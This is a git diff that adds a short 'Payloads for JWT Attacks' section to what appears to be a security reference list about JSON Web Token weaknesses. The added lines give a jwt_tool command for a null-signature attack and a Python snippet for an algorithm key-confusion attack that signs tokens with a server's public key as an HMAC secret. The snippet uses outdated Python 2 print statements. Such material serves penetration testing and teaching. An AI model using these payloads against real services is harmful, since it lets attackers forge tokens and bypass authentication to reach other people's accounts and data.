@@ -67,3 +67,25 @@ JSON Web Tokens (JWTs) offer a convenient method for implementing authentication
 * [Simple JWT Hacking](https://medium.com/iqube-kct/simple-jwt-hacking-73870a976750) - Another article explaining JWT Hacking
 
 ### Payloads for JWT Attacks
+
+- JWT Signature Null Signature Attack
+
+Exploit:
+```
+python3 jwt_tool.py JWT_HERE -X n
+
+```
+Deconstructed:
+```
+{"alg":"HS256","typ":"JWT"}.
+{"sub":"1234567890","name":"John Doe","iat":1516239022}
+```
+- JWT Signature Key Confusion Attack
+
+```
+import jwt
+public = open('public.pem', 'r').read()
+print public
+print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
+
+```
